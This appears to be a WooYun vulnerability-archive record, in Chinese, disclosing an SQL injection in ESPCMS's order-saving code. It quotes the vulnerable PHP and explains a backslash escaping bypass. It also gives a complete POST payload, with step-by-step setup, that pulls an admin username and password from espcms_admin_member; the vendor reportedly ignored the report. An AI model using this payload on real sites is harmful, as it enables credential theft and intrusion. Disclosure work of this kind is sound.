{"id": 48858, "wybug_id": "wooyun-2014-076417", "wybug_title": "espcms sql注入漏洞", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "Noxxx", "wybug_date": "2014-09-18 15:29", "wybug_open_date": "2014-12-14 15:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-23：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向公众公开  简要描述： 刚刚看了 espcms的官网 发现2014-09-16 16:58:17更新了,下了份看下，发现这上面的几个漏洞完全没修复啊..上次提交了个漏洞只给了5rank..敢给多点么.这次和上次那个相似,怕你们只修复一处,这处也提交下。 详细说明：  在order.php in_ordersave中     365-367行附近 \nforeach ($did as $key => $value) {\t\t\t\t$value = intval($value);\t\t\t\t$oprice[$key] = floatval($oprice[$key]);\t\t\t\t$bprice[$key] = floatval($bprice[$key]);\t\t\t\t$countprice[$key] = floatval($countprice[$key]);\t\t\t\t$amount[$key] = intval($amount[$key]);\t\t\t\tif ($key == $arraycount) {\t\t\t\t\t$db_values.= \"($insert_id,$value,'$tsn[$key]','$ptitle[$key]',$oprice[$key],$bprice[$key],$countprice[$key],$amount[$key],1)\";\t\t\t\t} else {\t\t\t\t\t$db_values.= \"($insert_id,$value,'$tsn[$key]','$ptitle[$key]',$oprice[$key],$bprice[$key],$countprice[$key],$amount[$key],1),\";\t\t\t\t}\t\t\t}\n这个 $tsn 和 $did $ptitle 都是可控的变量 就是等于 $_POST[XXX]看这个 $tsn 如果不是数组会怎么样?取值就会变成 $tsn{x}的方式所以我们可以利用这个来达到绕过转义的限制 来达到注入的目的。$cookiceprice = $this->fun->eccode(md5(\"$productmoney|$discount_productmoney\"), 'ENCODE', db_pscode);if ($uncartid && is_array($uncartid) && !empty($ordersncode) && $cookiceprice == $ordersncode) {\n$cartid = $this->fun->eccode($this->fun->accept('ecisp_order_list', 'C'), 'DECODE', db_pscode);\t\t$cartid = stripslashes(htmlspecialchars_decode($cartid));\t\t$uncartid = !empty($cartid) ? unserialize($cartid) : 0;\n进入流程需要上面的条件。uncartid 是购物车列表里面的。后面的几个验证也是的。我们只需要在【产品展示】->找一个产品然后【我要购买】就可以加入购物车里面了。然后点【下一步（结算）】记住总金额。index.php?ac=order&at=ordersaveproductmoney和discount_productmoney替换成产品的金额。productmoney=15000&discount_productmoney=15000&tsn=\\&userid=4&did[x]=1&amount=1&ptitle[x]=,(SELECT CONCAT(USERNAME,0x7c,PASSWORD) FROM espcms_admin_member LIMIT 1 ),1,1,1,1,1)#&email=xxx@qq.com&bprice=1&countprice=1&opid=1&osid=1uid换成自己的 uid怎么获得 提交订单的页面 右键查看源码 \t<input type=\"hidden\" name=\"userid\" value=\"4\"/>即可   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-14 15:30 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-18 15:33 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  你关注的绿帽子 Noxxx 发表了漏洞 espcms sql注入漏洞    \n     2014-09-19 00:23 |    \t\t绿帽子 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:3        | 咪咪)\t\t \n  ???    \n     2015-03-31 09:31 |    \t\tZombiecc \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | just for fun.)\t\t \n  为啥官方版本到现在还没有修补这个漏洞    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}